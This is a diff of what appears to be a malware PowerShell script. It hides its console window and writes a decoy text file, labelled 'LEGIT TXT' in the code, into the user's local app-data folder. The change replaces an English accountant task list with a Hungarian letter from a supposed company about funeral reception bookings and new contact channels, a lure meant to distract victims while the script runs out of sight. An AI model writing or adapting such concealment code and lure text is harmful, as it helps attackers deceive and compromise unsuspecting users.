@@ -9,59 +9,31 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
 # CREATE AND RUN LEGIT TXT
-$fileName = "Task_for_accountant_of_department_02.txt"
+$fileName = "01 - Frissített emlékfogadási csomagok.txt"
 $filePath = Join-Path $env:LOCALAPPDATA $fileName
 
 $content = @"
-Task_for_employee:
+Kedves Kolléga!
 
-Task 1: Transferring data to a table
-    Open List_of_materials.txt.
-    Create a new file Materials_sorted.xlsx.
-    Transfer all data from the text file into a table, creating the columns: Name, Quantity, Unit_of_measure, Cost_per_unit, Supplier.
-    Sort the data by the Supplier column in alphabetical order.
-    Save the file.
+Reméljük, jól van.
 
-Task 2: Checking and editing the statement
-    Open Statement_of_completed_work.xlsx
-    Check each entry to ensure it follows the following format:
-        The due date must be in the format DD.MM.YYYY.
-        Quantity must be a number greater than 0.
-    Please correct any errors if you find any.
-    Add a new column Notes and for rows where Quantity > 100, write "Large Volume".
-    Save the file.
+A temetőben a temetési szertartások zökkenőmentes lebonyolításának támogatása érdekében szeretnénk tájékoztatni Önöket a temetési fogadási műveletekkel kapcsolatos számos frissítésről.
 
-Task 3: Creating a reporting document
-    Use the data from Acceptance_acts.txt and Construction_employees.xlsx.
-    Create a new file Report_on_acts.docx.
-    Create a table with the columns: Act_number, Date, Object, Amount, Status, Responsible_person
-    Transfer data from Acts_of_acceptance.txt.
-    For each act, in the Responsible Person column, indicate the "responsible person from the file Employees_builders.docx".
-    Sort data by Date (newest to oldest).
-    Save the file.
+A kommunikáció és a foglalási hatékonyság javítása érdekében frissítettük a temetési szertartásokat követő fogadási szolgáltatások elsődleges foglalási eljárásait és elérhetőségeit.
 
-Task 4: Summary table by suppliers
-    Open the file Materials_sorted.xlsx.
-    Create a pivot table on a new sheet.
-    In the rows, indicate the Supplier, in the columns - the Name, and in the values ​​- the amount for the column Cost per order × Quantity (total cost).
-    Add a filter by the Unit_meas column.
-    Save the changes to the same file.
+2026. augusztus 1-jétől minden fogadási foglalással, időpontfoglalással és koordinációs kéréssel kapcsolatban a frissített elérhetőségi csatornáinkon keresztül kell foglalkozni.
 
-Task 5: Final Report to Management
-    Use the files Statement of completed works.xlsx and Report on acts.docx.
-    Create a new document Final_report_17.10.2025.docx.
-    At the beginning of the document, add a title page with the title: “Final Report on Construction Work” and the date 10/17/2025.
-    Insert a table with summary data:
-        Total number of completed works.
-        Total amount according to acts.
-        Number of acts with the status "Not closed".
-    At the end of the document, add a "Comments" section where you indicate:
-        If there are lines marked "Large Volume", list their numbers.
-        If there are acts without a responsible person, indicate their numbers.
-    Save the file.
+Kérjük, hogy munkatársaink továbbra is irányítsák csapatunkhoz a temetés utáni fogadási lehetőségekkel kapcsolatban érdeklődő családokat, és hogy a jövőbeni koordináció esetén a mellékelt elérhetőségeket használják.
 
-Additional note:
-    Save all final files in the Report_on_17.10.2025 folder and send them as a .rar archive.
+A fogadási lehetőségeink továbbra is elérhetőek a temetőben tartott szertartásokhoz, és továbbra is szorosan együttműködünk a temetkezési vállalkozókkal, a papokkal és a temető személyzetével annak biztosítása érdekében, hogy a fogadási időbeosztás összhangban legyen a temetési szertartásokkal.
+
+Amennyiben a szertartások időpontjának változása miatt bármilyen ütemezési módosítás merül fel, kérjük, mielőbb tájékoztassák Önöket, hogy ennek megfelelően tudjuk fogadni a családokat.
+
+Köszönjük folyamatos együttműködésüket és támogatásukat. Nagyra értékeljük a kiépített szakmai kapcsolatot, és örömmel folytatjuk szoros együttműködésünket.
+
+Üdvözlettel,
+
+Dolorosa Kft.
 "@
 
 $content | Out-File -FilePath $filePath -Encoding UTF8
